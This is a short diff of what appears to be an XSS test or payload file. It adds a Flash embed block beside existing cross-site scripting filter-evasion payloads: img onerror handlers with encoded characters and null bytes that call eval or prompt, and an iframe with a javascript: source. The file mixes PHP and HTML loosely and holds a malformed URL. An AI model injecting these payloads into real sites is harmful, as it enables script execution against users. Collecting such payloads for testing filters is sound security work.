@@ -2,6 +2,12 @@
 
 include 'log.php';
 
+<object>
+       <embed src="FlashApp.swf" flashvars="repository=http;//mydomain/index.htm">
+       </embed>
+</object>
+ 
+ 
 ?></script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
 <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
 <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
